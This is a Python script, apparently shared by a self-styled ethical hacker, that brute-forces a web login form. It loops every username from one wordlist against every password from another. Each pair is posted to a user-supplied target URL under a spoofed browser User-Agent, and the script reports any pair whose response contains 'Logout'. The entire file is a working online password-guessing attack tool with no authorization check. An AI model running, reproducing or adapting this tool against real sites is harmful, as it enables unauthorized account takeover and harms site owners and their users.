#!/usr/bin/env python3
'''
    This script is written by ethical hacker and programmer Cyb3rnavy
    Instagram: https://instagram.com/cyb3ernavy
    Website: https://www.cyb3rnavy.tk
'''
import os, sys
import requests

# Reading user list
def getUsername():
    global user_list
    try:
        username = input("Please type location to username list\nroot~$ ")
        user_list = open(username, 'r').read().split('\n')
        print("\033[32m[+] User list '{}' successfuly added!\033[0m".format(username))
        i = 0
        for user in user_list:
            i = 1 + i
            print("\033[33m[{}] {}\033[0m".format(i, user))
        if input("Found {} users, is this information correct? (\033[32myes\033[0m/\033[31mno\033[0m)\nroot~$ ".format(i)).lower() != 'yes':
            print("Undefined answer, please answer only with 'yes' or 'no'")
            sys.exit(1)
    except FileNotFoundError:
        print("\033[31mError file not found\033[0m")
        sys.exit(1)
    except: 
        sys.exit(1)
# Reading password list
def getPassword():
    global password_list
    try:
        password = input("Please type location to password list\nroot~$ ")
        password_list = open(password, "r").read().split("\n")
        passwords = len(password_list)
        print('\033[32m[+] Loading {} passwords...\033[0m'.format(passwords))
    except FileNotFoundError:
        print("\033[31mError file not found\033[0m")
        sys.exit(1)
    except:
        sys.exit(1)
# Setting target to bruteforce
def setTarget():
    global target
    try: 
        target = str(input("Please type the target url to bruteforce...\nroot ~$ "))
    except:
        sys.exit(1)
# Starting brute force
def startAttack():
    try:
        if str(input("That legendary time is here, do you want to continue? \nAfter this, you can't go back. (\033[32myes\033[0m/\033[31mno\033[0m)\nroot ~$ ")) == 'yes':
            print("% BRUTE FORCE IN PROGRESS... %")
            for user in user_list:
                for password in password_list:
                    with requests.Session() as s:
                        data = {
                            'username': user,
                            'password': password,
                            'cmdlogin': 'Login',
                        }
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15'
                        }
                        r = s.post(url=target, data=data, headers=headers, cookies=s.cookies)
                        if "Logout" in r.text:
                            print('Credentials found: {}:{}'.format(user, password))
    except requests.ConnectionError:
        print("Error timed out, please niaga yrt retal...")
# Main function
if __name__ == "__main__":
    # Setting username
    getUsername()
    # Setting password
    getPassword()
    # Setting the target
    setTarget()
    # Starting attack
    startAttack()